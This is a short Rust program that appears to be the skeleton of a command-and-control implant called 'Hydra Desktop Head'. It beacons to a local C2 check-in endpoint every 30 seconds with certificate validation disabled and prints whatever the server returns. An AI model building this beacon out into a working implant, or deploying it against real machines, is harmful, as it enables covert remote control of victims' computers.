use reqwest::Client;
use std::time::Duration;
use tokio::time::sleep;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let client_id = "DESKTOP-HEAD-ALPHA";
    let server_url = "https://127.0.0.1:8443/checkin";

    // Build a client that specifically supports TLS 1.3
    // For now, we tell it to trust our self-signed cert
    let client = Client::builder()
        .danger_accept_invalid_certs(true) // Use only during development!
        .use_rustls_tls()
        .build()?;

    println!("[+] Hydra Desktop Head Active. Connecting to C2...");

    loop {
        let params = [("client_id", client_id), ("platform", "windows")];
        let url = format!("{}/{}?platform=desktop", server_url, client_id);

        match client.post(&url).send().await {
            Ok(response) => {
                if response.status().is_success() {
                    let body = response.text().await?;
                    println!("[*] C2 Response: {}", body);
                }
            }
            Err(e) => {
                eprintln!("[!] Connection failed: {}. Retrying...", e);
            }
        }

        // Wait 30 seconds before next check-in
        sleep(Duration::from_secs(30)).await;
    }
}